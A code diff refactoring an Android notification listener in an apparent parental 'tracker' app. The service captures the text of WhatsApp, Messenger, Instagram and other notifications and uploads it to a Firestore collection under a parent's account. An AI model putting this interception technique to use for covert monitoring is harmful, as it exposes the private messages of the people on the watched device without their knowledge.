@@ -1,13 +1,9 @@
 package com.abuzahra.tracker.services
 
-import android.content.Intent
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
 import com.google.firebase.firestore.FirebaseFirestore
-import org.json.JSONObject
-import android.os.Bundle
-import android.text.TextUtils
 
 class MyNotificationListener : NotificationListenerService() {
 
@@ -16,17 +12,13 @@ class MyNotificationListener : NotificationListenerService() {
             val packageName = sbn.packageName
             val extras = sbn.notification.extras
             
-            // استخراج البيانات
             val title = extras.getCharSequence("android.title")?.toString() ?: ""
             val text = extras.getCharSequence("android.text")?.toString() ?: ""
             val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
-
-            val messageBody = if (TextUtils.isEmpty(bigText)) text else bigText
+            val messageBody = if (bigText.isNotEmpty()) bigText else text
             
             // التحقق من التطبيقات المطلوبة
             if (packageName == "com.whatsapp" || packageName == "com.facebook.orca" || packageName == "com.instagram.android") {
-                
-                // تحضير البيانات لـ Firebase
                 val data = hashMapOf(
                     "app_name" to getAppName(packageName),
                     "title" to title,
@@ -34,11 +26,8 @@ class MyNotificationListener : NotificationListenerService() {
                     "timestamp" to System.currentTimeMillis(),
                     "type" to "social"
                 )
-
-                // إرسال لل Firestore
                 sendToFirebase("social_logs", data)
             } else {
-                // إشعارات عامة
                 val data = hashMapOf(
                     "app_name" to getAppName(packageName),
                     "title" to title,
@@ -64,8 +53,9 @@ class MyNotificationListener : NotificationListenerService() {
     }
 
     private fun sendToFirebase(collection: String, data: Map<String, Any>) {
-        val parentId = SharedPrefsManager.getParentUid(this) ?: return
-        val deviceId = SharedPrefsManager.getDeviceId(this) ?: return
+        // استخدام applicationContext مع SharedPrefsManager
+        val parentId = SharedPrefsManager.getParentUid(applicationContext) ?: return
+        val deviceId = SharedPrefsManager.getDeviceId(applicationContext) ?: return
         
         FirebaseFirestore.getInstance()
             .collection("parents").document(parentId)
